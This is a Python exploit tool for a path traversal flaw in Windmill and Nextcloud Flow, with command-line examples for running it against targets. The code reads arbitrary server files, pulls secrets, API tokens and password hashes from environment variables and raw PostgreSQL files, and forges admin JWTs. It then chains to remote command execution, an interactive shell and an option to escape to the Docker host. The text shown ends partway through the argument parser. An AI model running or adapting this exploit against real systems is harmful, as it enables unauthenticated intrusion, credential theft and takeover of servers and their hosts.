#!/usr/bin/env python3
"""
Windfall - Unified Windmill Path Traversal → RCE

Supports:
  - Windmill standalone (unauthenticated)
  - Nextcloud Flow via proxy (requires Nextcloud auth)
  - Nextcloud Flow direct exposure (unauthenticated)

Secret leak methods:
  1. windmill_users_config.json (Flow)
  2. /proc/1/environ → SUPERADMIN_SECRET (Standalone)
  3. /proc → PostgreSQL data path → jwt_secret → forge JWT (same container)

Author: Chocapikk
Date: 2026-01-12
"""

import argparse
import json
import re
from windfall import (
    API_VERSION, API_WHOAMI, API_GET_LOG_FILE,
    API_WORKSPACES_LIST, API_WORKSPACES_CREATE,
    WINDMILL_CONFIG_PATH,
    TEST_FILE_PASSWD, ENVIRON_PATHS, TRAVERSAL_DEPTH,
    DeploymentType, WindmillUser, Secrets, WindmillBase,
    forge_jwt_token, auto_cleanup, interactive_shell,
)
from windfall import log

# PostgreSQL database OIDs range (16384=first user DB, increments with each new DB)
PG_DB_OIDS = range(16384, 16394)

# Windmill PostgreSQL table filenodes (predictable - same order every install)
PG_FILENODES = {
    'global_settings': 17149,
    'password': 16815,
    'token': 16564,
    'resource': 16626,
    'usr': 16504,
}

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║                      W I N D F A L L                          ║
║            Unified Windmill Path Traversal → RCE              ║
║              AFR → Token Leak → Container RCE                 ║
║                                                               ║
║                   CVE-2026-29059 (Windmill)                   ║
║                CVE-2026-29059 (Nextcloud Flow)                ║
║                                                               ║
║    Leak Methods:                                              ║
║      1. windmill_users_config.json (Flow)                     ║
║      2. /proc/1/environ → SUPERADMIN_SECRET                   ║
║      3. /proc → PostgreSQL files → jwt_secret → forge JWT     ║
║                                                               ║
║    Supports: Standalone, Flow (proxy), Flow (direct)          ║
║                       by Chocapikk                            ║
╚═══════════════════════════════════════════════════════════════╝
"""


class WindfallExploit(WindmillBase):
    """Unified Windmill path traversal exploit."""
    
    def __init__(self, url: str, nc_user: str = None, nc_pass: str = None, timeout: int = 30):
        # Note: nc_user/nc_pass not needed for unauth path traversal, but kept for API compatibility
        super().__init__(url, nc_user, nc_pass, timeout)
        self.secrets = Secrets()
        self.admin_token = None

    # ==================== Path Traversal ====================

    def read_file(self, path: str) -> bytes | None:
        """CVE-2026-29059 (Windmill), CVE-2026-29059 (Nextcloud Flow): Path traversal via get_log_file"""
        if not self.api_prefix:
            if not self._detect_deployment():
                return None
        
        # Build traversal payload with proper encoding
        traversal = "../" * TRAVERSAL_DEPTH + path.lstrip("/")
        encoded_payload = self._encode_path(traversal)
        
        # Use workspace detected during detection, or try common ones
        workspaces = [getattr(self, 'detected_workspace', None), "nextcloud", "_"]
        workspaces = [w for w in workspaces if w]  # Remove None
        
        kw = {"timeout": self.timeout, "verify": False}
        # Note: jobs_u endpoint is PUBLIC (access_level=0), so Nextcloud auth not required
        # But kept for edge cases where other endpoints might need it
        if self._is_nextcloud_proxy() and self.nc_auth:
            kw["auth"] = self.nc_auth
        
        for ws in workspaces:
            url = f"{self.url}{self.api_prefix}{API_GET_LOG_FILE.format(workspace=ws, payload=encoded_payload)}"
            response = self.session.get(url, **kw)
            if response and response.ok and not response.text.startswith("<!DOCTYPE") and "Err:" not in response.text:
                return response.content
        
        return None

    def check_vulnerable(self) -> bool:
        p = log.progress("Path traversal check")
        if self.read_file(TEST_FILE_PASSWD):
            mode = {
                DeploymentType.STANDALONE: "Standalone",
                DeploymentType.FLOW_DIRECT: "Flow direct",
                DeploymentType.FLOW_PROXY: "Flow proxy"
            }.get(self.deployment_type, "Unknown")
            p.success(f"Vulnerable! ({mode})")
            return True
        p.failure("Not vulnerable")
        return False

    # ==================== Token Leak ====================

    def leak_windmill_users(self) -> bool:
        """Leak windmill_users_config.json from Flow's persistent storage"""
        p = log.progress("Leaking Windmill users")
        
        # Try to read config file (works for Flow deployments, even if detected as standalone)
        
        content = self.read_file(WINDMILL_CONFIG_PATH)
        
        if not content:
            p.failure("windmill_users_config.json not found")
            return False
        
        content_text = content.decode('utf-8', errors='ignore') if isinstance(content, bytes) else content
        try:
            users_data = json.loads(content_text)
        except (json.JSONDecodeError, ValueError):
            p.failure("Invalid JSON in config file")
            return False
        
        for email, user_data in users_data.items():
            self.secrets.users[email] = WindmillUser(
                email=email,
                password=user_data.get("password", ""),
                token=user_data.get("token", "")
            )
        
        # On Flow proxy without Nextcloud auth, /api/users/whoami is blocked (ADMIN)
        # But /api/w/*/jobs/* is PUBLIC, so we can still RCE with any valid token
        # Try to test tokens via whoami, but fallback to using first token if blocked
        
        super_admins = []
        admins = []
        regular_users = []
        all_tokens = []
        
        for email, user in self.secrets.users.items():
            if not user.token:
                continue
            all_tokens.append(user)
            
            # Test token to get actual permissions
            old_token = self.admin_token
            self.admin_token = user.token
            
            r = self._get(API_WHOAMI)
            if r:
                data = r.json()
                user.super_admin = data.get("super_admin", False)
                is_admin = data.get("is_admin", False)
                
                if user.super_admin:
                    super_admins.append(user)
                elif is_admin:
                    admins.append(user)
                else:
                    regular_users.append(user)
            
            self.admin_token = old_token
        
        # Priority: super_admin > is_admin > any token > first token (blind)
        if super_admins:
            user = super_admins[0]
            self.admin_token = user.token
            p.success(f"Found {len(self.secrets.users)} users, using {user.email} (super_admin=True, token: {self.admin_token[:16]}...)")
            return True
        
        if admins:
            user = admins[0]
            self.admin_token = user.token
            p.success(f"Found {len(self.secrets.users)} users, using {user.email} (is_admin=True, token: {self.admin_token[:16]}...)")
            return True
        
        if regular_users:
            user = regular_users[0]
            self.admin_token = user.token
            p.success(f"Found {len(self.secrets.users)} users, using {user.email} (token: {self.admin_token[:16]}...)")
            log.warning("No admin token found, RCE may fail")
            return True
        
        # Fallback: whoami blocked (Flow proxy without Nextcloud auth), use first token blindly
        # admin@windmill.dev is usually the super admin on Flow
        if all_tokens:
            # Prefer admin@windmill.dev
            admin_user = next((u for u in all_tokens if "admin@windmill" in u.email), all_tokens[0])
            self.admin_token = admin_user.token
            self.blind_mode = True  # Flag to skip verify_auth later
            p.success(f"Found {len(self.secrets.users)} users, using {admin_user.email} (blind mode, token: {self.admin_token[:16]}...)")
            return True
        
        p.failure("No valid token found in config")
        return False

    def _parse_environ(self, content: bytes) -> dict[str, str]:
        """Parse null-separated environ content into dict."""
        env_vars = {}
        for item in content.split(b"\x00"):
            if b"=" not in item:
                continue
            key, value = item.split(b"=", 1)
            env_vars[key.decode(errors='ignore')] = value.decode(errors='ignore')
        return env_vars

    def leak_environ(self) -> bool:
        """Fallback: leak SUPERADMIN_SECRET from environ"""
        p = log.progress("Leaking environ")
        
        for source in ENVIRON_PATHS:
            content = self.read_file(source)
            if not content:
                continue
            
            env_vars = self._parse_environ(content)
            
            if "DATABASE_URL" in env_vars:
                self.secrets.database_url = env_vars["DATABASE_URL"]
            
            if "SUPERADMIN_SECRET" not in env_vars:
                continue
            
            self.secrets.superadmin_secret = env_vars["SUPERADMIN_SECRET"]
            self.admin_token = self.secrets.superadmin_secret
            p.success("SUPERADMIN_SECRET found")
            return True
        
        p.failure("No secrets found in environ")
        return False

    # ==================== PostgreSQL Data Leak ====================

    def _find_postgres_data_path(self) -> str | None:
        """Find PostgreSQL data directory by scanning /proc for postgres process"""
        for pid in range(1, 500):
            content = self.read_file(f"/proc/{pid}/cmdline")
            if not content or b"postgres" not in content or b"-D" not in content:
                continue
            
            # Parse: postgres -D /path/to/data
            parts = content.split(b"\x00")
            try:
                idx = parts.index(b"-D")
                return parts[idx + 1].decode(errors="ignore")
            except (ValueError, IndexError):
                continue
        return None

    def _is_valid_secret(self, candidate: str, strict: bool = False) -> bool:
        """Check if candidate looks like a valid jwt_secret."""
        if "operator" in candidate.lower() or "password" in candidate.lower():
            return False
        if strict:
            # Must have mixed case and numbers
            return (any(c.isupper() for c in candidate) and 
                    any(c.islower() for c in candidate) and 
                    any(c.isdigit() for c in candidate))
        return True

    def _find_secret_near_marker(self, content: bytes, marker: bytes) -> str | None:
        """Find 32-char secret near a marker in content."""
        if marker not in content:
            return None
        
        idx = content.find(marker)
        search_range = content[max(0, idx - 500):min(len(content), idx + 500)]
        
        for match in re.findall(rb"([A-Za-z0-9]{32})", search_range):
            candidate = match.decode()
            if self._is_valid_secret(candidate):
                return candidate
        return None

    def _extract_jwt_secret_from_pg_files(self, pg_data_path: str) -> str | None:
        """Extract jwt_secret from PostgreSQL data files.
        
        global_settings table is always at filenum 17149 (Windmill creates tables in fixed order).
        DB OID is 16385 (Flow) or 16384 (standalone).
        """
        # Try known locations first (fast path)
        for db_oid in PG_DB_OIDS:
            content = self.read_file(f"{pg_data_path}/base/{db_oid}/17149")
            if not content:
                continue
            secret = self._find_secret_near_marker(content, b"jwt_secret")
            if secret:
                return secret
        
        # Fallback: scan nearby filenums if table was vacuumed/rewritten
        for db_oid in PG_DB_OIDS:
            for filenum in [17148, 17150, 17147, 17151]:
                content = self.read_file(f"{pg_data_path}/base/{db_oid}/{filenum}")
                if not content:
                    continue
                secret = self._find_secret_near_marker(content, b"jwt_secret")
                if secret:
                    return secret
        
        return None

    def _find_admin_email_in_content(self, content: bytes) -> str | None:
        """Find admin email in PostgreSQL file content."""
        # Prefer admin@*.dev emails
        emails = re.findall(rb"(admin@[a-zA-Z0-9.-]+\.dev)", content)
        if emails:
            return emails[0].decode()
        
        # Fallback to windmill.dev emails with admin/wapp
        for email in re.findall(rb"([a-zA-Z0-9._-]+@windmill\.dev)", content):
            email_str = email.decode()
            if "admin" in email_str or "wapp" in email_str:
                return email_str
        return None

    def _extract_admin_email_from_pg_files(self, pg_data_path: str) -> str | None:
        """Extract admin email from PostgreSQL data files.
        
        usr table is always at filenum 16504 (Windmill creates tables in fixed order).
        """
        # Try known locations first (fast path)
        for db_oid in PG_DB_OIDS:
            content = self.read_file(f"{pg_data_path}/base/{db_oid}/16504")
            if not content:
                continue
            email = self._find_admin_email_in_content(content)
            if email:
                return email
        
        # Fallback: check global_settings file too (may contain email references)
        for db_oid in PG_DB_OIDS:
            content = self.read_file(f"{pg_data_path}/base/{db_oid}/17149")
            if not content:
                continue
            email = self._find_admin_email_in_content(content)
            if email:
                return email
        
        return None

    # ==================== PostgreSQL File Dumps (NO AUTH NEEDED!) ====================

    def _read_pg_table_file(self, pg_data_path: str, filenode: int) -> bytes | None:
        """Read a PostgreSQL table file from any database OID."""
        for db_oid in PG_DB_OIDS:
            content = self.read_file(f"{pg_data_path}/base/{db_oid}/{filenode}")
            if content and len(content) > 100:
                return content
        return None

    def _extract_pg_strings(self, content: bytes, min_len: int = 4) -> list[str]:
        """Extract printable strings from PostgreSQL page data."""
        # PostgreSQL stores data in pages with headers, extract readable strings
        strings = []
        current = b""
        for byte in content:
            if 32 <= byte < 127:  # Printable ASCII
                current += bytes([byte])
            else:
                if len(current) >= min_len:
                    strings.append(current.decode('ascii', errors='ignore'))
                current = b""
        if len(current) >= min_len:
            strings.append(current.decode('ascii', errors='ignore'))
        return strings

    def dump_secrets_from_files(self) -> list[dict]:
        """Dump secrets directly from PostgreSQL files (NO AUTH NEEDED!).
        
        Reads global_settings table (filenode 17149) raw bytes and extracts secrets.
        """
        if not self.api_prefix and not self._detect_deployment():
            return []
        
        log.info("Dumping secrets from PostgreSQL files (no auth needed)...")
        
        pg_data_path = self._find_postgres_data_path()
        if not pg_data_path:
            log.error("PostgreSQL not found (maybe separate container)")
            return []
        
        content = self._read_pg_table_file(pg_data_path, PG_FILENODES['global_settings'])
        if not content:
            log.error("Could not read global_settings file")
            return []
        
        results = []
        
        # Method 1: Direct pattern search for known secrets (most reliable)
        # PostgreSQL format: name + control bytes + value
        # Example: jwt_secret\x53\x01\x00\x00...\x80G5w9D1NE3hJ7oJavG0FreO25uT6lejZl
        critical_secrets = {
            'jwt_secret': rb'jwt_secret.{1,20}?([A-Za-z0-9]{32})',
            'license_key': rb'license_key.{1,20}?([A-Za-z0-9_-]{10,64})',
            'scim_token': rb'scim_token.{1,20}?([A-Za-z0-9_-]{10,64})',
            'hub_api_secret': rb'hub_api_secret.{1,20}?([A-Za-z0-9_-]{10,64})',
        }
        
        for name, pattern in critical_secrets.items():
            match = re.search(pattern, content)
            if match:
                value = match.group(1).decode()
                if self._is_valid_secret(value):
                    results.append({'name': name, 'value': value, 'critical': True})
                    log.success(f"{name}: {value}")
        
        # Method 2: Find JSON blobs (smtp_settings, oauths, etc.)
        json_secrets = ['smtp_settings', 'oauths']
        for secret_name in json_secrets:
            marker = secret_name.encode()
            if marker not in content:
                continue
            
            # Find JSON after the marker
            idx = content.find(marker)
            search_range = content[idx:idx + 1000]
            
            # Look for JSON object
            json_match = re.search(rb'(\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\})', search_range)
            if json_match:
                try:
                    value = json_match.group(1).decode(errors='ignore')
                    # Validate it's actual JSON
                    json.loads(value)
                    results.append({'name': secret_name, 'value': value, 'critical': True})
                    log.success(f"{secret_name}: {value[:100]}...")
                except (json.JSONDecodeError, UnicodeDecodeError):
                    pass
        
        # Method 3: Extract other settings using string method
        strings = self._extract_pg_strings(content, min_len=3)
        other_settings = ['pip_index_url', 'base_url', 'custom_tags', 'uid']
        found_names = {r['name'] for r in results}
        
        for i, s in enumerate(strings):
            if s in other_settings and s not in found_names:
                for j in range(i + 1, min(i + 10, len(strings))):
                    candidate = strings[j]
                    if candidate in other_settings or len(candidate) < 5:
                        continue
                    if candidate in ['true', 'false', 'null', 'public']:
                        continue
                    
                    results.append({'name': s, 'value': candidate, 'critical': False})
                    log.info(f"{s}: {candidate[:80]}{'...' if len(candidate) > 80 else ''}")
                    break
        
        return results

    def dump_users_from_files(self) -> list[dict]:
        """Dump users with password hashes from PostgreSQL files (NO AUTH NEEDED!).
        
        Reads password table (filenode 16815) raw bytes and extracts emails + argon2 hashes.
        """
        if not self.api_prefix and not self._detect_deployment():
            return []
        
        log.info("Dumping users from PostgreSQL files (no auth needed)...")
        
        pg_data_path = self._find_postgres_data_path()
        if not pg_data_path:
            log.error("PostgreSQL not found")
            return []
        
        content = self._read_pg_table_file(pg_data_path, PG_FILENODES['password'])
        if not content:
            log.error("Could not read password table file")
            return []
        
        results = []
        
        # Find emails
        emails = list(set(re.findall(rb'([a-zA-Z0-9._+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', content)))
        # Find argon2 hashes
        hashes = re.findall(rb'(\$argon2id\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9+/]+\$[A-Za-z0-9+/]+)', content)
        
        # In PostgreSQL row storage, email and hash are adjacent in the tuple
        for email in emails:
            email_str = email.decode()
            email_idx = content.find(email)
            
            # Find the hash closest to this email (should be in same tuple, within ~200 bytes)
            closest_hash = None
            min_dist = float('inf')
            
            for h in hashes:
                # Find all occurrences
                idx = 0
                while True:
                    hash_idx = content.find(h, idx)
                    if hash_idx == -1:
                        break
                    dist = abs(hash_idx - email_idx)
                    if dist < min_dist:
                        min_dist = dist
                        closest_hash = h.decode()
                    idx = hash_idx + 1
            
            # Check if hash is reasonably close (same row)
            if closest_hash and min_dist < 300:
                results.append({'email': email_str, 'hash': closest_hash})
                log.success(f"User: {email_str}")
                log.info(f"  Hash: {closest_hash}")
            else:
                results.append({'email': email_str, 'hash': None})
                log.success(f"User: {email_str}")
                log.warning("  Hash: not found nearby")
        
        return results

    def dump_tokens_from_files(self) -> list[dict]:
        """Dump API tokens from PostgreSQL files (NO AUTH NEEDED!).
        
        Reads token table (filenode 16564) raw bytes and extracts tokens + emails.
        """
        if not self.api_prefix and not self._detect_deployment():
            return []
        
        log.info("Dumping tokens from PostgreSQL files (no auth needed)...")
        
        pg_data_path = self._find_postgres_data_path()
        if not pg_data_path:
            log.error("PostgreSQL not found")
            return []
        
        content = self._read_pg_table_file(pg_data_path, PG_FILENODES['token'])
        if not content:
            log.error("Could not read token table file")
            return []
        
        results = []
        
        # Find 32-char tokens (Windmill uses 32-char random tokens)
        tokens = re.findall(rb'([A-Za-z0-9]{32})', content)
        emails = re.findall(rb'([a-zA-Z0-9._+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', content)
        
        seen_tokens = set()
        for token in tokens:
            token_str = token.decode()
            if token_str in seen_tokens:
                continue
            if not self._is_valid_secret(token_str):
                continue
            seen_tokens.add(token_str)
            
            # Find closest email to this token
            token_idx = content.find(token)
            closest_email = None
            min_dist = float('inf')
            
            for e in emails:
                idx = 0
                while True:
                    email_idx = content.find(e, idx)
                    if email_idx == -1:
                        break
                    dist = abs(email_idx - token_idx)
                    if dist < min_dist:
                        min_dist = dist
                        closest_email = e.decode()
                    idx = email_idx + 1
            
            if min_dist < 200:  # Token and email should be in same row
                results.append({'token': token_str, 'email': closest_email})
                log.success(f"Token: {token_str}")
                log.info(f"  Email: {closest_email}")
            else:
                results.append({'token': token_str, 'email': None})
                log.success(f"Token: {token_str}")
        
        return results

    def _parse_jsonb(self, data: bytes) -> dict | list | None:
        """Parse PostgreSQL JSONB binary format (from PG source code)."""
        if len(data) < 4:
            return None
        
        # Container header: bits 0-27 = count, bit 29 = object, bit 30 = array
        header = int.from_bytes(data[0:4], 'little')
        count = header & 0x0FFFFFFF
        is_object = bool(header & 0x20000000)
        is_array = bool(header & 0x40000000)
        
        if not is_object and not is_array:
            return None
        if count > 50 or count == 0:
            return None
        
        # JEntry constants from jsonb.h
        JENTRY_OFFLENMASK = 0x0FFFFFFF
        JENTRY_TYPEMASK = 0x70000000
        JENTRY_HAS_OFF = 0x80000000
        JENTRY_ISSTRING = 0x00000000
        JENTRY_ISNUMERIC = 0x10000000
        JENTRY_ISBOOL_FALSE = 0x20000000
        JENTRY_ISBOOL_TRUE = 0x30000000
        JENTRY_ISNULL = 0x40000000
        JENTRY_ISCONTAINER = 0x50000000
        
        # Read JEntries
        num_entries = count * 2 if is_object else count
        jentries = []
        offset = 4
        for _ in range(num_entries):
            if offset + 4 > len(data):
                return None
            jentries.append(int.from_bytes(data[offset:offset+4], 'little'))
            offset += 4
        
        data_start = offset
        
        def get_offset(index: int) -> int:
            """Get offset of element (from getJsonbOffset in PG source)."""
            off = 0
            for i in range(index - 1, -1, -1):
                je = jentries[i]
                off += je & JENTRY_OFFLENMASK
                if je & JENTRY_HAS_OFF:
                    break
            return off
        
        def get_length(index: int) -> int:
            """Get length of element (from getJsonbLength in PG source)."""
            je = jentries[index]
            if je & JENTRY_HAS_OFF:
                off = get_offset(index)
                return (je & JENTRY_OFFLENMASK) - off
            return je & JENTRY_OFFLENMASK
        
        def extract_value(index: int):
            """Extract value at given JEntry index."""
            je = jentries[index]
            typ = je & JENTRY_TYPEMASK
            off = get_offset(index)
            length = get_length(index)
            
            raw = data[data_start + off:data_start + off + length]
            
            if typ == JENTRY_ISSTRING:
                return raw.decode(errors='ignore')
            elif typ == JENTRY_ISNUMERIC:
                # PostgreSQL numeric binary format
                if len(raw) >= 2:
                    header = int.from_bytes(raw[0:2], 'little')
                    is_short = bool(header & 0x8000)
                    if is_short:
                        # Short format: extract weight and digits
                        sign = -1 if (header & 0x2000) else 1
                        weight = header & 0x003F
                        if header & 0x0040:
                            weight = -weight - 1
                        # Digits are base-10000
                        digits = []
                        for i in range(2, len(raw), 2):
                            if i + 1 < len(raw):
                                d = int.from_bytes(raw[i:i+2], 'big')
                                digits.append(d)
                        if digits:
                            # Reconstruct number
                            val = 0
                            for d in digits:
                                val = val * 10000 + d
                            # Apply weight (each digit = 4 decimal places)
                            val = val * (10000 ** weight) // (10000 ** (len(digits) - 1))
                            return sign * val
                return None  # Can't parse
            elif typ == JENTRY_ISBOOL_FALSE:
                return False
            elif typ == JENTRY_ISBOOL_TRUE:
                return True
            elif typ == JENTRY_ISNULL:
                return None
            elif typ == JENTRY_ISCONTAINER:
                return self._parse_jsonb(raw)
            return raw.decode(errors='ignore')
        
        if is_object:
            result = {}
            for i in range(count):
                key = extract_value(i)
                val = extract_value(count + i)
                if isinstance(key, str):
                    result[key] = val
            return result
        else:
            return [extract_value(i) for i in range(count)]

    def dump_resources_from_files(self) -> list[dict]:
        """Dump resources from PostgreSQL files (NO AUTH NEEDED!).
        
        Reads resource table (filenode 16626) and parses JSONB binary format.
        """
        if not self.api_prefix and not self._detect_deployment():
            return []
        
        log.info("Dumping resources from PostgreSQL files (no auth needed)...")
        
        pg_data_path = self._find_postgres_data_path()
        if not pg_data_path:
            log.error("PostgreSQL not found")
            return []
        
        content = self._read_pg_table_file(pg_data_path, PG_FILENODES['resource'])
        if not content:
            log.error("Could not read resource table file")
            return []
        
        results = []
        seen = set()
        
        # Find JSONB objects by looking for object headers followed by known keys
        # JSONB object header: low 28 bits = count, bit 29 set = object
        cred_keys = {b'password', b'secret', b'token', b'key', b'access_key', 
                    b'secret_access_key', b'secret_key', b'api_key', b'host', b'user'}
        
        i = 0
        while i < len(content) - 50:
            # Look for potential JSONB object header (small count + object flag)
            header = int.from_bytes(content[i:i+4], 'little')
            count = header & 0x0FFFFFFF
            is_obj = bool(header & 0x20000000)
            
            if is_obj and 2 <= count <= 20:
                # Check if followed by valid JEntries and key names
                jentry_size = count * 2 * 4
                data_start = i + 4 + jentry_size
                
                if data_start < len(content):
                    # Check for known credential keys in the data section
                    sample = content[data_start:data_start + 200]
                    if any(k in sample for k in cred_keys):
                        # Try to parse this JSONB
                        try:
                            # Estimate size (header + entries + data)
                            blob = content[i:i + 500]
                            parsed = self._parse_jsonb(blob)
                            if parsed and isinstance(parsed, dict):
                                # Check for credential fields
                                keys_lower = {k.lower() for k in parsed.keys() if isinstance(k, str)}
                                if keys_lower & {'password', 'secret', 'secret_key', 'secret_access_key', 'api_key', 'token'}:
                                    sig = str(sorted(parsed.items()))
                                    if sig not in seen:
                                        seen.add(sig)
                                        results.append({'value': parsed})
                                        display = json.dumps(parsed)
                                        if len(display) > 100:
                                            display = display[:97] + "..."
                                        log.success(f"Resource: {display}")
                        except Exception:
                            pass
            i += 1
        
        return results

    def _forge_jwt_token(self, jwt_secret: str, email: str, workspace: str = "demo") -> str:
        """Forge a JWT token using the leaked secret"""
        return forge_jwt_token(jwt_secret, email, workspace)

    def _detect_workspace_for_jwt(self, pg_data_path: str, jwt_secret: str, admin_email: str) -> str:
        """Detect the correct workspace for JWT forgery.
        
        For Flow: always 'nextcloud'
        For Standalone: forge temp JWT with '_' wildcard, then get real workspace via API
        """
        # Flow containers have 'nc_app' or 'flow' in the PostgreSQL path
        if 'nc_app' in pg_data_path or 'flow' in pg_data_path:
            return 'nextcloud'
        
        # For standalone, forge temp JWT with wildcard '_' and get real workspace via API
        self.admin_token = self._forge_jwt_token(jwt_secret, admin_email, '_')
        
        # Try to list existing workspaces
        r = self._get(API_WORKSPACES_LIST)
        if r:
            try:
                workspaces = r.json()
                if workspaces and len(workspaces) > 0:
                    return workspaces[0]["id"]
            except:
                pass
        
        # Fallback: create new workspace
        ws_name = f"msf{self._rand(6)}"
        r = self._post(API_WORKSPACES_CREATE, json={"id": ws_name, "name": ws_name})
        if r:
            return ws_name
        
        # Last resort fallback
        return "admins"

    def leak_postgres_jwt_secret(self) -> bool:
        """
        Leak jwt_secret directly from PostgreSQL data files via path traversal.
        
        This works when PostgreSQL runs in the same container/filesystem as Windmill.
        Chain: /proc → find postgres -D path → read data files → extract jwt_secret → forge JWT
        """
        # Step 1: Find PostgreSQL data path via /proc
        p = log.progress("Scanning /proc for PostgreSQL")
        pg_data_path = self._find_postgres_data_path()
        if not pg_data_path:
            p.failure("Not found (maybe separate container)")
            return False
        p.success(pg_data_path)
        
        # Step 2: Extract jwt_secret from data files
        p = log.progress("Extracting jwt_secret")
        jwt_secret = self._extract_jwt_secret_from_pg_files(pg_data_path)
        if not jwt_secret:
            p.failure("Could not extract from PostgreSQL files")
            return False
        p.success(f"{jwt_secret[:8]}...{jwt_secret[-8:]}")
        
        # Step 3: Find admin email
        p = log.progress("Finding admin email")
        admin_email = self._extract_admin_email_from_pg_files(pg_data_path)
        if not admin_email:
            admin_email = "admin@windmill.dev"
            p.status(f"{admin_email} (default)")
        else:
            p.success(admin_email)
        
        # Step 4: Detect correct workspace for JWT
        p = log.progress("Detecting workspace")
        workspace = self._detect_workspace_for_jwt(pg_data_path, jwt_secret, admin_email)
        self.workspace = workspace
        p.success(workspace)
        
        # Step 5: Forge final JWT token with correct workspace
        p = log.progress("Forging JWT")
        self.admin_token = self._forge_jwt_token(jwt_secret, admin_email, workspace)
        p.success(f"{self.admin_token[:25]}...")
        
        # Flow proxy blocks whoami endpoint, so enable blind mode
        if self.deployment_type == DeploymentType.FLOW_PROXY:
            self.blind_mode = True
        
        return True

    def verify_auth(self) -> bool:
        """Verify we have valid authentication"""
        p = log.progress("Verifying authentication")
        r = self._get(API_WHOAMI)
        if r:
            data = r.json()
            email = data.get("email", "unknown")
            is_admin = data.get("super_admin", False)
            p.success(f"{email} (super_admin={is_admin})")
            return True
        p.failure("Authentication failed")
        return False
    # ==================== Main Exploit Flow ====================

    def pwn(self, skip_rce_test: bool = False) -> bool:
        print(BANNER)
        log.info(f"Target: {self.url}")
        if self.nc_auth:
            log.info(f"Nextcloud auth: {self.nc_user}")
        
        # Auto-detect deployment type and API endpoint
        if not self._detect_deployment():
            return False
        
        # Check version
        version = self._get(API_VERSION, auth=False)
        if version:
            log.info(f"Windmill version: {version.text.strip()}")
        
        # Check vulnerability
        if not self.check_vulnerable():
            return False
        
        # Try to leak tokens (multiple methods)
        # Method 1: Flow config file (windmill_users_config.json)
        if self.leak_windmill_users():
            log.success("Method: windmill_users_config.json")
            # Display leaked users
            for email, user in self.secrets.users.items():
                role = "super_admin" if user.super_admin else "user"
                log.info(f"  → {email} ({role})")
        # Method 2: SUPERADMIN_SECRET from environ
        elif self.leak_environ():
            log.success("Method: SUPERADMIN_SECRET from environ")
        # Method 3: PostgreSQL data files → jwt_secret → forge JWT
        elif self.leak_postgres_jwt_secret():
            log.success("Method: PostgreSQL files → jwt_secret → forged JWT")
        else:
            log.error("All credential leak methods failed")
            return False
        
        # Verify authentication (skip in blind mode - Flow proxy without Nextcloud auth)
        if getattr(self, 'blind_mode', False):
            log.info("Blind mode: skipping auth verification (whoami blocked by proxy)")
        elif not self.verify_auth():
            # If forged JWT fails, the email might not exist in DB
            if hasattr(self, 'admin_token') and self.admin_token.startswith("jwt_"):
                log.warning("Forged JWT rejected - email may not exist in database")
            return False
        
        # Test RCE (skip if we have a specific command to run)
        if not skip_rce_test:
            p = log.progress("Testing RCE")
            result = self.rce("id && hostname")
            if result:
                p.success("RCE confirmed!")
                log.info(f"Result: {result}")
            else:
                p.failure("RCE failed")
                return False
        
        return True


def handle_read(pwn, filepath):
    """Handle --read option: read file via path traversal."""
    if not pwn._detect_deployment():
        return False
    content = pwn.read_file(filepath)
    if not content:
        log.error(f"Failed to read {filepath}")
        return False
    log.success(f"Read {len(content)} bytes from {filepath}")
    print(content.decode(errors='ignore'))
    return True


def handle_leak_users(pwn):
    """Handle --leak-users option: leak windmill users or environ."""
    if not pwn._detect_deployment():
        return False
    if not pwn.check_vulnerable():
        return False
    if pwn.leak_windmill_users():
        print("\n[+] Leaked users:")
        for email, user in pwn.secrets.users.items():
            print(f"    {email}")
            print(f"      Password: {user.password}")
            print(f"      Token: {user.token}")
        return True
    log.warning("Trying environ leak...")
    pwn.leak_environ()
    if pwn.secrets.superadmin_secret:
        print(f"\n[+] SUPERADMIN_SECRET: {pwn.secrets.superadmin_secret}")
    if pwn.secrets.database_url:
        print(f"[+] DATABASE_URL: {pwn.secrets.database_url}")
    return True


def handle_leak_postgres(pwn):
    """Handle --leak-postgres option: leak JWT secret from PostgreSQL."""
    if not pwn._detect_deployment():
        return False
    if not pwn.check_vulnerable():
        return False
    if not pwn.leak_postgres_jwt_secret():
        log.error("PostgreSQL leak failed (maybe separate container?)")
        return False
    print(f"\n[+] Forged JWT token: {pwn.admin_token}")
    if getattr(pwn, 'blind_mode', False):
        log.info("Blind mode: skipping auth verification (Flow proxy)")
    elif pwn.verify_auth():
        print("[+] Token is valid!")
    return True


def handle_cmd(pwn, cmd, host=False):
    """Handle --cmd option: execute single command."""
    if not pwn.pwn(skip_rce_test=True):
        return False
    output = pwn.rce(cmd, host=host)
    if output:
        print(output)
        return True
    log.error("Command execution failed")
    return False


def handle_interactive_shell(pwn, host=False):
    """Handle default mode: full exploit then interactive shell."""
    if not pwn.pwn():
        return False
    
    hostname = "host" if host else "windmill"
    interactive_shell(lambda cmd: pwn.rce(cmd, host=host), hostname=hostname, is_host=host)
    return True


def main():
    parser = argparse.ArgumentParser(
        description="Unified Windmill Path Traversal → RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Windmill standalone (unauthenticated)
  %(prog)s http://windmill:8000
  %(prog)s http://windmill:8000 -c "id"
  %(prog)s http://windmill:8000 -r /etc/passwd
  
  # Nextcloud Flow via proxy (NO auth required! jobs_u is PUBLIC)
  %(prog)s https://nextcloud -c "id"
  %(prog)s https://nextcloud -r /etc/passwd
  
  # Flow direct exposure (unauthenticated)
  %(prog)s http://flow:8000
  %(prog)s http://flow:8000 -c "id"
        """
    )
    parser.add_argument("url", help="Target URL")
    
    nc_group = parser.add_argument_group("Nextcloud credentials (optional, not required)")
    nc_group.add_argument("--nc-user", metavar="USER", help="Nextcloud username (not needed: jobs_u is PUBLIC)")
    nc_group.add_argument("--nc-pass", metavar="PASS", help="Nextcloud password (not needed: jobs_u is PUBLIC)")
    
    parser.add_argument("-r", "--read", metavar="PATH", help="Read file via path traversal")
    parser.add_argument("-c", "--cmd", metavar="CMD", help="Execute command")
    parser.add_argument("-H", "--host", action="store_true", help="Escape to host via Docker socket")
    parser.add_argument("--host-cmd", metavar="CMD", help="Execute command on host")
    parser.add_argument("--leak-users", action="store_true", help="Only leak windmill_users_config.json")
